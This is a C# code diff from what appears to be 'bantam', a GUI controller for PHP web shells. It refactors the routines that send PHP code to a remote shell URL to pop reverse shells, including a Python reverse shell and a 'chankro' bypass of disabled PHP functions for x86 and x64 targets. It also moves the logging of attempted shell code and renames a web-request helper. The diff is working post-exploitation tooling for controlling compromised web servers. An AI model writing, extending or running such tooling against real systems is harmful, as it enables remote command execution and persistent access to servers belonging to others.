@@ -197,26 +197,30 @@ namespace bantam.Forms
         }
 
         /// <summary>
-        /// Normal request routine for popping reverse shell
+        /// Task wrapper for popping reverse shell without chankro
         /// </summary>
         /// <param name="shellCode"></param>
         private async Task PopReverseShell(string shellCode)
         {
             string phpCode = PhpBuilder.ExecuteSystemCode(shellCode, false);
-            await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode).ConfigureAwait(false));
+            await Task.Run(() => WebRequestHelper.ExecuteRemotePHP(ShellUrl, phpCode, true).ConfigureAwait(false));
+
+            if (checkBoxLogShellCode.Checked) {
+                LogHelper.AddShellLog(ShellUrl, "Attempted to pop chankro reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.REQUESTED);
+            }
         }
 
         /// <summary>
-        /// 
+        /// Task wrapper for spawning a chankro shell
         /// </summary>
         /// <param name="phpCode"></param>
         private async Task PopChankroShell(string phpCode)
         {
-            await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode).ConfigureAwait(false));
+            await Task.Run(() => WebRequestHelper.ExecuteRemotePHP(ShellUrl, phpCode, true).ConfigureAwait(false));
         }
 
         /// <summary>
-        /// 
+        /// Main shell poping routine
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -286,6 +290,8 @@ namespace bantam.Forms
 
                     shellCode = PythonShell(ipv4, port);
                     PopReverseShell(shellCode);
+
+                    lblStatus.Text = "Goodluck! :D";
                 return;
                 default:
                     lblStatus.Text = "Unknown shell vector, GUI Error";
@@ -295,10 +301,6 @@ namespace bantam.Forms
             if (checkBoxDisabledFunctionsBypass.Checked) {
                 shellCode = Helper.EncodeBase64ToString(shellCode);
 
-                if (checkBoxLogShellCode.Checked) {
-                    LogHelper.AddShellLog(ShellUrl, "Attempted to pop chankro reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.REQUESTED);
-                }
-
                 if (comboBoxArch.Text == "x86") {
                     PopChankroShell(Chankro32BitShell(shellCode));
                 } else if(comboBoxArch.Text == "x64") {
@@ -307,10 +309,6 @@ namespace bantam.Forms
                     lblStatus.Text = "Unknown chankro architecture vector, GUI Error";
                 }
             } else {
-                if (checkBoxLogShellCode.Checked) {
-                    LogHelper.AddShellLog(ShellUrl, "Attempted to pop reverse shell with [ " + shellCode + " ] ", LogHelper.LOG_LEVEL.REQUESTED);
-                }
-
                 PopReverseShell(shellCode);
             }
             lblStatus.Text = "Goodluck! :D";
@@ -323,7 +321,7 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private async void buttonGetIpv4_Click(object sender, EventArgs e)
         {
-            var task = WebHelper.GetRequest("http://ipv4bot.whatismyipaddress.com/");
+            var task = WebRequestHelper.GetRequest("http://ipv4bot.whatismyipaddress.com/");
 
             if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                 if (string.IsNullOrEmpty(task.Result)) {
